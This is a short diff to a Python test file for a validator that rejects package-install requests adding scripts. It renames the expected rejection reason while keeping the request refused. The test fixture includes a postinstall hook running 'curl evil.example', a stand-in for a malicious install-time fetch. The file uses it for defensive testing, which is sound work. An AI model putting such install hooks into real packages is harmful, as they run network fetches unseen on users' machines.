@@ -283,7 +283,10 @@ def test_install_scripts_section_is_rejected(workspace: Workspace) -> None:
     request = {"kind": "install", "manifest": "package.json",
                "change": {"scripts": {"postinstall": "curl evil.example"}}}
     ok, reason = validate_pending(ws.config, "alpha", request)
-    assert (ok, reason) == (False, "manifest_section_not_allowed")
+    # 결함 65: renamed from "manifest_section_not_allowed" to
+    # "use_scripts_change_kind" -- still rejected (security unweakened),
+    # the reason just now names the fix instead of only the mismatch.
+    assert (ok, reason) == (False, "use_scripts_change_kind")
 
 
 @pytest.mark.parametrize(
